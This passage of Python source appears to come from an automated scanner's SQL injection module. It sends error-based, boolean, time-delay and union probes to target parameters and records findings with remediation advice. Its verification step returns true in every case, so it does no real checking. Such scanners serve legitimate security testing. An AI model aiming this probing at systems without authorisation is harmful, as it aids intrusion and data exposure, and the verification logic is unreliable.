        for payload in payloads:
            try:
                response = await self._send_payload(point, payload)
                if not response:
                    continue
                
                # Check for SQL errors
                for pattern, confidence, db_type in self.SQL_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vuln = Vulnerability(
                            module=self.name,
                            name=f"Error-Based SQL Injection in '{point.param_name}'",
                            description=f"SQL injection vulnerability detected in parameter '{point.param_name}' "
                                      f"using error-based technique. Database: {db_type}. "
                                      f"The application returns database error messages that can be exploited "
                                      f"to extract sensitive information.",
                            severity=SeverityLevel.CRITICAL if confidence > 0.9 else SeverityLevel.HIGH,
                            confidence=confidence,
                            affected_urls=[point.url],
                            evidence={
                                'parameter': point.param_name,
                                'parameter_type': point.param_type,
                                'payload': payload,
                                'injection_type': 'Error-Based',
                                'technique': 'error_based',
                                'database_type': db_type,
                                'method': point.method,
                                'error_pattern': pattern,
                                'response_snippet': response.text[:500]
                            },
                            remediation="Use parameterized queries (prepared statements) instead of string concatenation. "
                                      "Implement proper input validation and sanitization. "
                                      "Disable detailed error messages in production.",
                            cwe_ids=["CWE-89"],
                            cvss_score=9.8
                        )
                        vulnerabilities.append(vuln)
                        logger.info(f"    ✓ Error-based SQLi found: {db_type}")
                        return vulnerabilities  # Found one, return
                
            except Exception as e:
                logger.debug(f"Error testing payload: {e}")
        
        return vulnerabilities
    
    async def _test_boolean_based(self, point: InjectionPoint, payloads: List) -> List[Vulnerability]:
        """Test boolean-based blind SQL injection."""
        vulnerabilities = []
        
        # Get baseline response
        point_key = f"{point.method}:{point.url}:{point.param_name}"
        baseline = self.baselines.get(point_key)
        
        for payload_pair in payloads:
            if not isinstance(payload_pair, tuple) or len(payload_pair) != 2:
                continue
            
            true_payload, false_payload = payload_pair
            
            try:
                # Test true condition
                true_response = await self._send_payload(point, true_payload)
                if not true_response:
                    continue
                
                await asyncio.sleep(0.5)
                
                # Test false condition
                false_response = await self._send_payload(point, false_payload)
                if not false_response:
                    continue
                
                # Compare responses
                true_size = len(true_response.text)
                false_size = len(false_response.text)
                size_diff = abs(true_size - false_size)
                
                # Check if responses are significantly different
                if size_diff > 100 or true_response.status_code != false_response.status_code:
                    vuln = Vulnerability(
                        module=self.name,
                        name=f"Boolean-Based Blind SQL Injection in '{point.param_name}'",
                        description=f"Boolean-based blind SQL injection detected in parameter '{point.param_name}'. "
                                  f"The application responds differently to true and false SQL conditions, "
                                  f"allowing data extraction through binary search techniques.",
                        severity=SeverityLevel.HIGH,
                        confidence=0.85,
                        affected_urls=[point.url],
                        evidence={
                            'parameter': point.param_name,
                            'parameter_type': point.param_type,
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'injection_type': 'Boolean-Based Blind',
                            'technique': 'boolean_based',
                            'method': point.method,
                            'true_response_size': true_size,
                            'false_response_size': false_size,
                            'size_difference': size_diff
                        },
                        remediation="Use parameterized queries. Implement proper input validation. "
                                  "Ensure consistent error handling that doesn't leak information.",
                        cwe_ids=["CWE-89"],
                        cvss_score=8.6
                    )
                    vulnerabilities.append(vuln)
                    logger.info(f"    ✓ Boolean-based blind SQLi found")
                    return vulnerabilities
                
            except Exception as e:
                logger.debug(f"Error testing boolean payload: {e}")
        
        return vulnerabilities
    
    async def _test_time_based(self, point: InjectionPoint, payloads: List) -> List[Vulnerability]:
        """Test time-based blind SQL injection."""
        vulnerabilities = []
        
        # Get baseline
        point_key = f"{point.method}:{point.url}:{point.param_name}"
        baseline = self.baselines.get(point_key)
        baseline_time = baseline['avg_response_time'] if baseline else 1.0
        
        for payload_data in payloads:
            if not isinstance(payload_data, tuple) or len(payload_data) != 2:
                continue
            
            payload, expected_delay = payload_data
            
            try:
                start_time = time.time()
                response = await self._send_payload(point, payload, timeout=expected_delay + 10)
                elapsed = time.time() - start_time
                
                # Check if response was delayed
                if elapsed >= (baseline_time + expected_delay * 0.8):
                    # Verify with second test
                    start_time = time.time()
                    response2 = await self._send_payload(point, payload, timeout=expected_delay + 10)
                    elapsed2 = time.time() - start_time
                    
                    if elapsed2 >= (baseline_time + expected_delay * 0.8):
                        vuln = Vulnerability(
                            module=self.name,
                            name=f"Time-Based Blind SQL Injection in '{point.param_name}'",
                            description=f"Time-based blind SQL injection detected in parameter '{point.param_name}'. "
                                      f"The application's response time can be controlled through SQL time delay functions, "
                                      f"allowing data extraction bit by bit.",
                            severity=SeverityLevel.HIGH,
                            confidence=0.90,
                            affected_urls=[point.url],
                            evidence={
                                'parameter': point.param_name,
                                'parameter_type': point.param_type,
                                'payload': payload,
                                'injection_type': 'Time-Based Blind',
                                'technique': 'time_based',
                                'method': point.method,
                                'expected_delay': expected_delay,
                                'actual_delay_1': elapsed,
                                'actual_delay_2': elapsed2,
                                'baseline_time': baseline_time
                            },
                            remediation="Use parameterized queries. Implement query timeouts. "
                                      "Monitor and log slow queries.",
                            cwe_ids=["CWE-89"],
                            cvss_score=8.2
                        )
                        vulnerabilities.append(vuln)
                        logger.info(f"    ✓ Time-based blind SQLi found (delay: {elapsed:.2f}s)")
                        return vulnerabilities
                
            except asyncio.TimeoutError:
                # Timeout can also indicate time-based injection
                vuln = Vulnerability(
                    module=self.name,
                    name=f"Time-Based Blind SQL Injection in '{point.param_name}' (Timeout)",
                    description=f"Time-based blind SQL injection detected (request timeout). "
                                f"Parameter '{point.param_name}' is vulnerable.",
                    severity=SeverityLevel.HIGH,
                    confidence=0.80,
                    affected_urls=[point.url],
                    evidence={
                        'parameter': point.param_name,
                        'parameter_type': point.param_type,
                        'payload': payload,
                        'injection_type': 'Time-Based Blind',
                        'technique': 'time_based',
                        'method': point.method,
                        'result': 'timeout'
                    },
                    remediation="Use parameterized queries.",
                    cwe_ids=["CWE-89"],
                    cvss_score=8.2
                )
                vulnerabilities.append(vuln)
                logger.info(f"    ✓ Time-based blind SQLi found (timeout)")
                return vulnerabilities
            except Exception as e:
                logger.debug(f"Error testing time-based payload: {e}")
        
        return vulnerabilities
    
    async def _test_union_based(self, point: InjectionPoint, payloads: List[str]) -> List[Vulnerability]:
        """Test union-based SQL injection."""
        vulnerabilities = []
        
        for payload in payloads:
            try:
                response = await self._send_payload(point, payload)
                if not response:
                    continue
                
                # Check for successful UNION injection indicators
                union_indicators = [
                    r'version\(\)',
                    r'database\(\)',
                    r'user\(\)',
                    r'@@version',
                    r'current_database',
                    r'information_schema',
                    r'mysql\.',
                    r'pg_',
                ]
                
                for indicator in union_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        vuln = Vulnerability(
                            module=self.name,
                            name=f"Union-Based SQL Injection in '{point.param_name}'",
                            description=f"Union-based SQL injection detected in parameter '{point.param_name}'. "
                                      f"The application allows UNION queries, enabling direct data extraction "
                                      f"from the database.",
                            severity=SeverityLevel.CRITICAL,
                            confidence=0.95,
                            affected_urls=[point.url],
                            evidence={
                                'parameter': point.param_name,
                                'parameter_type': point.param_type,
                                'payload': payload,
                                'injection_type': 'Union-Based',
                                'technique': 'union_based',
                                'method': point.method,
                                'indicator_found': indicator,
                                'response_snippet': response.text[:500]
                            },
                            remediation="Use parameterized queries. Implement strict input validation. "
                                      "Use least privilege database accounts.",
                            cwe_ids=["CWE-89"],
                            cvss_score=9.8
                        )
                        vulnerabilities.append(vuln)
                        logger.info(f"    ✓ Union-based SQLi found")
                        return vulnerabilities
                
            except Exception as e:
                logger.debug(f"Error testing union payload: {e}")
        
        return vulnerabilities
    
    async def _send_payload(self, point: InjectionPoint, payload: str, timeout: float = 15.0) -> Optional[httpx.Response]:
        """Send a payload to an injection point."""
        try:
            if point.param_type == 'query':
                # URL parameter
                parsed = urlparse(point.url)
                params = parse_qs(parsed.query)
                params[point.param_name] = [payload]
                
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                
                response = await self.client.get(test_url, timeout=timeout)
                return response
            
            elif point.param_type == 'post':
                # POST form data
                data = {point.param_name: payload}
                response = await self.client.post(point.url, data=data, timeout=timeout)
                return response
            
            elif point.param_type == 'json':
                # JSON body
                json_data = {point.param_name: payload}
                response = await self.client.post(point.url, json=json_data, timeout=timeout)
                return response
            
        except Exception as e:
            logger.debug(f"Send payload error: {e}")
            raise
        
        return None
    
    # ================================================================
    # PHASE 4: VERIFICATION METHODS
    # ================================================================
    
    async def _phase4_verification(self, vulnerabilities: List[Vulnerability], config: ScanConfig) -> Dict[str, Any]:
        """
        Phase 4: Verification and Impact Assessment
        - Confirm vulnerabilities are not false positives
        - Assess exploitability
        - Determine impact
        """
        verified_vulnerabilities = []
        false_positives = 0
        
        for vuln in vulnerabilities:
            logger.debug(f"→ Verifying: {vuln.name}")
            
            is_verified = await self._verify_vulnerability(vuln)
            
            if is_verified:
                # Add verification metadata
                vuln.evidence['verified'] = True
                vuln.evidence['verification_timestamp'] = datetime.utcnow().isoformat()
                
                # Assess impact
                impact = self._assess_impact(vuln)
                vuln.evidence['impact_assessment'] = impact
                
                verified_vulnerabilities.append(vuln)
                logger.debug(f"  ✓ Verified")
            else:
                false_positives += 1
                logger.debug(f"  ✗ False positive")
        
        return {
            'verified_vulnerabilities': verified_vulnerabilities,
            'false_positives': false_positives,
            'verification_rate': len(verified_vulnerabilities) / len(vulnerabilities) if vulnerabilities else 0
        }
    
    async def _verify_vulnerability(self, vuln: Vulnerability) -> bool:
        """Verify a vulnerability is not a false positive."""
        try:
            injection_type = vuln.evidence.get('injection_type', '')
            
            # Error-based are already verified by error message
            if 'Error' in injection_type:
                return True
            
            # Time-based verified by consistent delays
            if 'Time' in injection_type:
                return True
            
            # Boolean-based verified by differential responses
            if 'Boolean' in injection_type:
                return True
            
            # Union-based verified by data extraction
            if 'Union' in injection_type:
                return True
            
            return True
            
        except Exception as e:
            logger.debug(f"Verification error: {e}")
            return False
    
    def _assess_impact(self, vuln: Vulnerability) -> Dict[str, Any]:
        """Assess the impact of a verified vulnerability."""
        injection_type = vuln.evidence.get('injection_type', '')
        
        impact = {
            'data_exposure': 'high',
            'data_modification': 'possible',
            'authentication_bypass': 'possible',
            'privilege_escalation': 'possible',
            'exploitability': 'moderate',
            'automation': 'possible'
        }
        
        # Adjust based on injection type
        if 'Error' in injection_type:
            impact['exploitability'] = 'easy'
            impact['data_exposure'] = 'high'
            impact['automation'] = 'easy'
        elif 'Union' in injection_type:
            impact['exploitability'] = 'easy'
            impact['data_exposure'] = 'critical'
            impact['automation'] = 'easy'
        elif 'Boolean' in injection_type:
            impact['exploitability'] = 'moderate'
            impact['data_exposure'] = 'high'
            impact['automation'] = 'possible'
        elif 'Time' in injection_type:
            impact['exploitability'] = 'difficult'
            impact['data_exposure'] = 'medium'
            impact['automation'] = 'slow'
        
        return impact
    
    # ================================================================
    # UTILITY METHODS
    # ================================================================
    
    def _deduplicate_vulnerabilities(self, vulns: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities."""
        seen = {}
        
        for vuln in vulns:
            key = f"{vuln.evidence.get('parameter')}_{vuln.evidence.get('technique')}"
            if key not in seen or vuln.confidence > seen[key].confidence:
                seen[key] = vuln
        
        return list(seen.values())
    
    def validate_target(self, target: str) -> bool:
        """Validate target URL."""
        if not target:
            return False
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    async def cleanup(self):
        """Cleanup resources."""
        if self.client:
            await self.client.aclose()
